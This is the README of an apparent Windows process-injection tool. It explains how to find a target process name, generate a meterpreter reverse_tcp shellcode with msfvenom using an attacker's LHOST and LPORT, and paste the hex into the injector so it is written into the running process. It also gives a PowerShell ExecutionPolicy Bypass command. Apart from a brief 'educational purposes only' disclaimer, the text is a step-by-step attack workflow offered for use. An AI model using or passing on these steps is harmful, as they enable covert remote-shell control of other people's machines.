## DISCLAIMER
**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY**
THE AUTHOR DOES NOT CONDONE, ENDORSE, OR ENCOURAGE ANY ILLEGAL ACTIVITY
THE USER IS SOLELY RESPONSIBLE FOR COMPLYING WITH ALL LOCAL LAWS AND REGULATIONS IN THEIR JURISDICTION

### Usage
To find out the real name of the process, you need to go to the scripts folder and run any file convenient for you.  
There are two realname-reader files in the folder, one with the .py extension written in Python, the other with the .ps1 extension written in PowerShell.  
If you prefer a Python script, open a terminal in the scripts folder and run `realname-reader.py`:
> You will need to install the psutil dependency to run this script.  
> Use: pip install psutil
```
python realname-reader.py
```
Then enter the name of the process you want that appears in the Task Manager.

If you prefer a PowerShell script, then run PowerShell in this folder and run `realname-reader_alt.ps1`:
```
powershell -ExecutionPolicy Bypass -File .\realname-reader_alt.ps1
```
Enter the name that appears in the task manager of the process you want.  
If the output shows multiple names, select the one you need.

Now you will need the msfvenom command-line utility from [Metasploit Framework](https://www.metasploit.com).  

Display a list of available payloads in the terminal:
```
msfvenom -l payloads
```

Select the one you need and, depending on the payload you selected, enter the required arguments.  
Example:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<PORT> -f hex
```

> To generate hex string, use -f hex

Display payload parameters:
```
msfvenom -p <the payload you selected> --list-options
```
After generation, copy the hex string

Download and run the .exe  
Enter what you selected when running any realname-reader script.  
After paste the resulting code from msfvenom
If everything went well, you will see the message Success and how many bytes were written in total.

### Compile
Open the project in Visual Studio 2022 (or newer)  
Set the build configuration to `Release` 
Build the solution by presing `Ctrl + Shift + B` or clicking `Build` -> `Build Solution`  
The Compiled .exe will be generated in the following folder:  
`bin\Release\net10.0\windows-codeinjector.exe`

### Compile Requirements
- Visual Studio 2022 (or newer)
- .NET 10 SDK